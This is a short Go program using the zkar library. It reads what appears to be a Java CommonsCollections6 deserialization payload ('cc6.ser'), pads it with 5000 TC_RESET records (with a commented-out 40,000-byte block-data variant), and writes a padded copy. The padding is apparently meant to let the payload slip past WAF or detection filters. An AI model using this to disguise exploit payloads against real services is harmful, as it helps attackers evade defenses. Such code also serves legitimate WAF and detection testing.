package main

import (
	"github.com/phith0n/zkar/serz"
	"io/ioutil"
	"log"
)

func main() {
	data, _ := ioutil.ReadFile("cc6.ser")
	serialization, err := serz.FromBytes(data)
	if err != nil {
		log.Fatalf("parse error")
	}

	// 在object后添加垃圾结构 替换TC_BLOCKDATALONG
	//var blockData = &serz.TCContent{
	//	Flag: serz.JAVA_TC_BLOCKDATALONG,
	//	BlockData: &serz.TCBlockData{
	//		Data: []byte(strings.Repeat("a", 40000)),
	//	},
	//}
	//serialization.Contents = append(serialization.Contents, blockData)

	// 在object前添加垃圾结构 替换TC_RESET
	var contents []*serz.TCContent
	for i := 0; i < 5000; i++ {
		var blockData = &serz.TCContent{
			Flag: serz.JAVA_TC_RESET,
		}
		contents = append(contents, blockData)
	}
	serialization.Contents = append(contents, serialization.Contents...)

	_ = ioutil.WriteFile("cc6-padding.ser", serialization.ToBytes(), 0o755)
}
